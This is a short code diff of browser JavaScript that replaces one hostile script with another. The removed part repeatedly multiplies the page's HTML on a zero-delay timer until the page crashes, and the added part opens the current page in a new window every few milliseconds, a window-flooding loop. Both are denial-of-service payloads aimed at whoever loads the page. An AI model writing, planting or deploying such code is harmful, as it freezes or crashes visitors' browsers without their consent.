@@ -1,15 +1,5 @@
-function replicate() {
-  document.body.innerHTML += 
-    document.body.innerHTML +
-    document.body.innerHTML +
-    document.body.innerHTML +
-    document.body.innerHTML +
-    document.body.innerHTML +
-    document.body.innerHTML +
-    document.body.innerHTML +
-    document.body.innerHTML +
-    document.body.innerHTML;
-  setInterval(crash, 0);
+function rep() {
+  open(location.href);
 }
 
-setInterval(replicate, 0);
+setInterval(rep, 0);
